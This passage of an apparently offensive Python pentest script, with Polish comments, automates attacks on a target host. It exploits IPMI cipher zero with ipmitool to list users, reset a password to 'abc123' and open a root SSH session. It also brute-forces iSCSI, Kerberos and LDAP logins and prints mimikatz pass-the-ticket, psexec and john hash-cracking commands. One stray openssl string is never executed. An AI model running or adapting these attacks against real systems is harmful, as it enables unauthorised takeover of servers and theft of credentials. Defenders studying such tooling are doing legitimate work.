	print("\t\t\tReason: "+nm[ip]['udp'][623]['reason'])
	print("\t\t\tProduct: "+nm[ip]['udp'][623]['product'])
	print("\t\t\tVersion: "+nm[ip]['udp'][623]['version'])
	print("\t\t\tMore Info: "+nm[ip]['udp'][623]['extrainfo'])

	try:
		print("\t\t\tIPMI Cipher Zero: "+nm[ip]['udp'][623]['script']['ipmi-cipher-zero'])
	except:
		print("There\'s no more information ...")

	#wykorzystanie luki IMPI zero cipher
	print("\t\t\tExploit the IPMI zero cipher vuln ...")
	print("\t\t\tIn new window  with root user and root password")
	com = "xterm -hold -e \'ipmitool -I lanplus -C 0 -H " + ip + " -U root -P root user list\'&"
	subprocess.call(com, shell=True)
	print("\t\t\tIn new window with user root and password  user set pass")
	com = "xterm -hold -e \'ipmitool -I lanplus -C 0 -H "+ip+" -U root -P root user set password 2 abc123\'&"
	"xterm -hold -e \'openssl s_client -connect "+srv+":443 -no_tls1_2 -fallback_scsv\'&"
	print("\t\t\tConnection by ssh in new window. Use those commands:\n\t\t\tpass\n\t\t\tversion\n\t\t\thelp")
	com = "xterm -hold -e \'ssh root@"+ip+"\'&"
	subprocess.call(com, shell=True)

def CVE_3260_iSCSI(ip):
	print("Checking iSCSI ...")
	nm = nmap.PortScanner()
	nm.scan(ip, arguments='-sSVC -p3260')

	print("\t\tService: "+nm[ip]['tcp'][3260]['name'])
	print("\t\t\tState: "+nm[ip]['tcp'][3260]['state'])
	print("\t\t\tReason: "+nm[ip]['tcp'][3260]['reason'])
	print("\t\t\tProduct: "+nm[ip]['tcp'][3260]['product'])
	print("\t\t\tVersion: "+nm[ip]['tcp'][3260]['version'])
	print("\t\t\tMore Info: "+nm[ip]['tcp'][3260]['extrainfo'])

	try:
		print("\t\t\tiSCSI Info: "+nm[ip]['tcp'][3260]['script']['iscsi-info'])
	except:
		print("")

	print("iSCSI Brute Force ...")
	nm.scan(ip, arguments='-p3260 --script iscsi-brute')

	print("\t\tService: "+nm[ip]['tcp'][3260]['name'])
	print("\t\t\tState: "+nm[ip]['tcp'][3260]['state'])
	print("\t\t\tReason: "+nm[ip]['tcp'][3260]['reason'])
	print("\t\t\tProduct: "+nm[ip]['tcp'][3260]['product'])
	print("\t\t\tVersion: "+nm[ip]['tcp'][3260]['version'])
	print("\t\t\tMore Info: "+nm[ip]['tcp'][3260]['extrainfo'])

	try:
		print("\t\t\tiSCSI Brute Force: "+nm[ip]['tcp'][3260]['script']['iscsi-brute'])
	except:
		print("")

def CVE_88_464_749_Kerberos(ip):
	print("\t\t88 tcp/udp kerberos\n\t\t464 tcp/udp kpasswd\n\t\t749 tcp/udp kerberos-adm")
	#przechwytywanie skrótów haseł w mimikatz
	print("\t\tCapturing hashes of password in mimikatz:commands:\n\t\tkerberos::\n\t\tkerberos::list /export")

	#ładowanie biletów Kerberos do pamięci mimikatz
	print("\t\tLoading Kerberos tickets to memory of mimikatz:")
	print("\t\tUse those commands:\n\t\t\tkerberos::ptt saved-to-file.kirbi")
	print("\t\t\tkerberos::ptt saved-to-file2.kirbi")
	print("\t\t\tkerberos::list")

	#wykonywanie poleceń przy podniesionych uprawnieniach(windows)
	print("\t\tExecuting commands with elevated privileges in windows: ")
	print("\t\t\texample: psexec \\\\dc1.abc.org cmd.exe")
	print("\t\t\twhoami")

	#wyliczanie dziedziny kerberos
	print("\t\tEnumerating the field of kerberos: ")
	kerb = input("Enter kerberos server[example: _kerberos.mit.edu]:")
	com = 'xterm -hold -e \'dig txt ' + kerb + ' +short\'&'
	print("In new window ...")
	subprocess.call(com, shell=True)

	#wyliczanie userów
	print("")
	nm = nmap.PortScanner()
	nm.scan(ip, arguments='-p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=\'research\'')

	print("\t\tService: "+nm[ip]['tcp'][88]['name'])
	print("\t\t\tState: "+nm[ip]['tcp'][88]['state'])
	print("\t\t\tReason: "+nm[ip]['tcp'][88]['reason'])
	print("\t\t\tProduct: "+nm[ip]['tcp'][88]['product'])
	print("\t\t\tVersion: "+nm[ip]['tcp'][88]['version'])
	print("\t\t\tMore Info: "+nm[ip]['tcp'][88]['extrainfo'])

	try:
		print("\t\tKerberos Enum Users: "+nm[ip]['tcp'][88]['script']['krb5-enum-users'])
	except:
		print("")

	#siłowe łamanie haseł
	print("Brute Force of passwords: ")
	print("ebrute.exe -r kerbenum -U users.txt -e research -h <ip>")

	print("""
		Microsoft:
			CVE-2014-6324
			CVE-2011-0043

		MIT:
			CVE-2014-4345
			CVE-2014-4343
			CVE-2012-1015
			CVE-2012-1014
			CVE-2011-0285
			CVE-2011-0284
			CVE-2010-1324
			CVE-2009-4212
			CVE-2009-0846
	""")

def CVE_389_636_3268_3269_LDAP(ip):
	print("LDAP: \n\t\t389 tcp/udp\n\t\t636 over TLS\n\t\t3268 tcp globalcat\n\t\t3269 tcp globalcats")

	#rozpoznanie
	print("Recognition of LDAP ...")
	nm = nmap.PortScanner()
	nm.scan(ip, arguments='-Pn -sV --script ldap-rootdse,ldap-search -p 389')

	print("\t\tService: "+nm[ip]['tcp'][389]['name'])
	print("\t\t\tState: "+nm[ip]['tcp'][389]['state'])
	print("\t\t\tReason: "+nm[ip]['tcp'][389]['reason'])
	print("\t\t\tProduct: "+nm[ip]['tcp'][389]['product'])
	print("\t\t\tVersion: "+nm[ip]['tcp'][389]['version'])
	print("\t\t\tMore Info: "+nm[ip]['tcp'][389]['extrainfo'])

	try:
		print("\t\tLDAP rootdse: "+nm[ip]['tcp'][389]['script']['ldap-rootdse'])
		print("\t\tLDAP search: "+nm[ip]['tcp'][389]['script']['ldap-search'])
	except:
		print("")


	#siłowe łamanie haseł na systemie windows:
	print("Brute force breaking passwords on the windows: ")
	print("ebrute.exe -r ldap -u da_craigb -h <ip> -e research -t 10 -P pass.txt")

	#łamanie hasła usera ujawnionego przez LDAP
	print("Breaking the user\'s password disclosed by LDAP: ")
	print("ldapsearch -D \"cn=admin\" -w secret123 -p 389 -h <ip> -s base -b \"ou=people,dc=orcharddrivellc,dc=com\" \"objectclass=*\")
	print("echo \"uid:userpassword\" > hash.txt")
	print("example: echo \"jsmith:{SSHA}...\" > hash.txt")
	print("john hash.txt -wordlist=common.txt")

	print("""Known vulns of LDAP:
		CVE-2015-0546
		CVE-2015-0117
		CVE-2012-6426
		CVE-2011-3508
		CVE-2011-1206
		CVE-2011-1561
		CVE-2011-0917
		CVE-2010-0358
	""")
